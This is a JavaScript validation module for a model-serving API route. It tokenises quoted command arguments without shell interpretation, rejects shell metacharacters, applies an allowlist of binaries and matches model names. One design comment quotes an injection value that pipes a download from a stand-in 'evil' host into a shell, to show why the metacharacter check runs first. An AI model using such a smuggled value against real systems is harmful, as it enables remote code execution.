// _serveCommand.cjs — request validation for POST /model/serve.
//
// Why this file exists at all: removing the shell from /model/serve was right,
// but the quote handling went with it. The route kept `cleaned.split(/\s+/)`,
// which is only a correct tokeniser for a string that has already been through
// a shell. The UI has always built the command WITH quotes
// (src/blocks/cookbook/index.jsx) so that a model path containing a space stays
// one argument. With shell:false and a naive split, `--model "Qwen/Qwen3-4B"`
// reached llama-server as the literal filename `"Qwen/Qwen3-4B"` — quotes
// included — and a path with a space arrived as two separate arguments.
//
// So: grouping is restored, interpretation is not. Nothing here expands,
// substitutes, globs, or re-parses. It splits a string into an argv array and
// removes quote characters that were only ever there to mark boundaries.
//
// Underscore-prefixed because the block loader and the cloud-parity scanner
// both treat `api/*.cjs` as mountable routers and `api/_*.cjs` as helpers.
'use strict';

const path = require('path');

// Unchanged from the route: rejected outright, never escaped. Nothing a model
// serve command legitimately needs contains any of these.
const SHELL_METACHARS = /[`\n\r;&|<>$(){}]/;

const DEFAULT_ALLOWED = ['vllm', 'llama-server', 'llama_server', 'python', 'python3', 'sglang', 'node', 'npx'];

/**
 * Split a command string into argv, honouring quotes for GROUPING ONLY.
 *
 * Grammar:
 *   command := WS* ( token WS+ )* token? WS*
 *   token   := piece+                     ; adjacent pieces concatenate: "a b"c -> `a bc`
 *   piece   := bare | dquoted | squoted
 *   bare    := [^\s"']+
 *   dquoted := '"' [^"]* '"'              ; contents literal
 *   squoted := "'" [^']* "'"              ; contents literal
 *
 * Deliberately NOT supported, and that is the point:
 *   - backslash escapes (\" \' \ ). Backslash is a Windows path separator here,
 *     nothing else. `C:\models\x.gguf` must survive verbatim.
 *   - $VAR / %VAR% expansion, ~ expansion, command substitution.
 *   - globbing — `*.gguf` is passed through as a literal argument.
 *   - operators (; & | < > && || redirects, subshells). Those never reach this
 *     function; parseServeCommand() refuses the whole string first.
 *   - here-docs, brace expansion, $'ansi-c' quoting.
 *
 * An empty QUOTED string ("" or '') is a real, empty argv entry. Runs of
 * unquoted whitespace produce no empty entries, as a shell would.
 *
 * @returns {{ok: true, tokens: string[]} | {ok: false, error: string}}
 */
function tokenizeCommand(input) {
  const s = input == null ? '' : String(input);
  const tokens = [];
  let cur = '';
  let open = false;     // a token has begun — tracked separately so "" yields ''
  let quote = null;     // '"' | "'" | null
  let quoteAt = -1;

  for (let i = 0; i < s.length; i++) {
    const ch = s[i];
    if (quote) {
      if (ch === quote) { quote = null; continue; }
      cur += ch;
      continue;
    }
    if (ch === '"' || ch === "'") { quote = ch; quoteAt = i; open = true; continue; }
    if (/\s/.test(ch)) {
      if (open) { tokens.push(cur); cur = ''; open = false; }
      continue;
    }
    cur += ch;
    open = true;
  }

  // R-05: an unterminated quote is not silently closed at end-of-string. That
  // would turn a typo into a different command than the operator typed.
  if (quote) {
    return {
      ok: false,
      error: `cmd has an unterminated ${quote === '"' ? 'double' : 'single'} quote (opened at position ${quoteAt}).`,
    };
  }
  if (open) tokens.push(cur);
  return { ok: true, tokens };
}

/**
 * Full validation for a /model/serve command string.
 *
 * Ordering is load-bearing:
 *   1. line-continuation fold + trim   (unchanged)
 *   2. metacharacter refusal ON THE RAW STRING, before any quote handling
 *   3. quote-aware tokenisation
 *   4. leading VAR=value env assignments, taken from the TOKENS
 *   5. allowlist on basename(argv[0])
 *
 * Step 2 stays ahead of step 3 on purpose. Moving it to a per-token check after
 * grouping would make quoting an escape hatch: `--model "; curl evil | sh"`
 * would pass, because the metacharacters would then live inside a token. Raw
 * first means the guarantee is "the string that arrived contains no shell
 * metacharacter at any nesting depth" — strictly stronger, and it costs nothing
 * legitimate. It also keeps the security decision in one place, so the
 * tokeniser is only ever a grouping function and can be reasoned about as one.
 *
 * Step 4 stays behind step 3, also on purpose: you cannot find where a
 * `VAR=value` word ends without first knowing where the token ends, which is
 * exactly what quoting decides. `HF_TOKEN="a b"` is one assignment, not two.
 *
 * @returns {{ok:true, cleaned, env, file, args, bin} | {ok:false, status, error}}
 */
function parseServeCommand(rawCmd, opts = {}) {
  const allowed = new Set(opts.allowed || DEFAULT_ALLOWED);

  const cleaned = (rawCmd == null ? '' : String(rawCmd)).replace(/\\\n/g, ' ').trim();
  if (!cleaned) return { ok: false, status: 400, error: 'cmd is required' };

  if (SHELL_METACHARS.test(cleaned)) {
    return {
      ok: false,
      status: 400,
      error: 'cmd may not contain shell metacharacters. Pass the executable and its flags only.',
    };
  }

  const tok = tokenizeCommand(cleaned);
  if (!tok.ok) return { ok: false, status: 400, error: tok.error };

  const env = {};
  let i = 0;
  for (; i < tok.tokens.length; i++) {
    const m = /^([A-Za-z_][A-Za-z0-9_]*)=(.*)$/.exec(tok.tokens[i]);
    if (!m) break;
    env[m[1]] = m[2];
  }

  const argv = tok.tokens.slice(i);
  const file = argv[0] || '';
  const bin = path.basename(file);
  if (!allowed.has(bin)) {
    return { ok: false, status: 400, error: `cmd binary '${bin}' not allowed` };
  }

  return { ok: true, cleaned, env, file, args: argv.slice(1), bin };
}

/**
 * Reduce a model identifier to something comparable across the three naming
 * schemes this block sees: HF repo ids (`unsloth/Qwen3-4B-GGUF`), catalog names
 * (`Qwen/Qwen3-4B`), and local-runtime registry ids (`qwen3-4b-instruct-q4`).
 */
function modelKey(id) {
  let s = String(id == null ? '' : id).trim().toLowerCase();
  s = s.split(/[\\/]/).filter(Boolean).pop() || '';
  s = s.replace(/\.gguf$/, '').replace(/[-_.]?gguf$/, '');
  s = s.replace(/[-_.](iq\d[a-z0-9_]*|q\d(?:_[a-z0-9]+)+|q\d|bf16|fp16|f16|fp8|f32|awq[a-z0-9-]*|gptq[a-z0-9-]*|exl2)$/, '');
  s = s.replace(/[-_.](instruct|chat|it)$/, '');
  return s;
}

/**
 * Is `repoId` among the installed models?
 *
 * Deliberately permissive. A false "installed" only returns the caller to the
 * old behaviour (spawn, then a real error); a false "not installed" would block
 * a serve that would have worked. So exact match, key match, and containment in
 * either direction all count.
 */
function isModelInstalled(repoId, installed) {
  const want = modelKey(repoId);
  if (!want) return false;
  const wantFull = String(repoId).trim().toLowerCase();
  for (const inst of installed || []) {
    if (!inst) continue;
    if (String(inst).trim().toLowerCase() === wantFull) return true;
    const have = modelKey(inst);
    if (!have) continue;
    if (have === want) return true;
    if (want.length >= 3 && have.includes(want)) return true;
    if (have.length >= 3 && want.includes(have)) return true;
  }
  return false;
}

module.exports = {
  SHELL_METACHARS,
  DEFAULT_ALLOWED,
  tokenizeCommand,
  parseServeCommand,
  modelKey,
  isModelInstalled,
};
